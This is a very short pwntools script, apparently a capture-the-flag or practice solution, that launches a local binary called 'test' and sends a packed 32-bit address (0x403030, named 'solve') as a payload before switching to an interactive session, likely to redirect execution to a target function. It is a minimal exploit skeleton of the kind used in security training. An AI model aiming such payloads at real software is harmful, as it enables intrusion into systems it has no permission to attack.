from pwn import *
p = process('test')

raw_input()
solve = 0x403030
pay = p32(solve)
p.send(pay)

p.interactive()
